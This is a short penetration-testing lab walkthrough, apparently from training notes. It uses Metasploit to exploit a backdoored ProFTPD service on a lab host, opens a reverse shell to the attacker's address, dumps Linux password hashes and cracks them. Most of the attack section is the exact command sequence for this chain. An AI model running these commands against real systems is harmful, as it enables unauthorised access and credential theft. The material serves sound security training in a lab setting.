# Password Cracker: Linux

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 3078–3116. Examples are lab-specific and need verification.

Auxiliary modules in the Metasploit Framework are versatile components used to perform a wide range of tasks that do not necessarily involve exploiting a vulnerability. These tasks can include scanning, enumeration, fuzzing, cracking hashes, and other network-related activities. Auxiliary modules are an essential part of the penetration testing process as they help gather information, identify potential targets, and assess the security posture of systems and networks.

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running a vulnerable application will be accessible at **demo.ine.local**.

**Objective:** Run the following auxiliary module against the target:root Password

- auxiliary/analyze/crack_linux

Tools: nmap , msf

```bash
ping -c 4 demo.ine.local
nmap -sS -sV demo.ine.local
nmap --script vuln -p 21 demo.ine.local
/etc/init.d/postgresql start

// We will start the postgresql database server on the attacker machine. We are starting postgresql to store all metasploit loot and other sensitive information from the target machine.

msfconsole -q
use exploit/unix/ftp/**proftpd_133c_backdoor**
**set payload payload/cmd/unix/reverse**
set RHOSTS demo.ine.local
set LHOST 192.70.114.2
exploit -z

use post/linux/gather/hashdump
set SESSION 1
exploit

use auxiliary/analyze/crack_linux
set SHA512 true
run

```

In this lab, we exploited a vulnerable application, peformed a hash dump and cracked the hash as well, all using metasploit modules.
